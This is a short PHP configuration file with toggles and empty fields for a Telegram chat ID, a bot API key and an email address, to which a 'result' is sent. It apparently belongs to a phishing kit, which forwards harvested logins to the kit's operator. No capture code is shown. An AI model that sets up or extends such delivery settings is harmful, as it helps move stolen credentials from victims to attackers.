<?php



$sendtotelegram="yes"; // If You Want to result on Telegram put yes otherwise put no
$chat_id = ""; // Your Telegram Chat ID
$bot_url = ""; // Your Telegram Bot Api Key
$sendtoemail="yes";// If you want to result on Email put yes otherwise put no
$email = ""; // Your Email Here :)


?>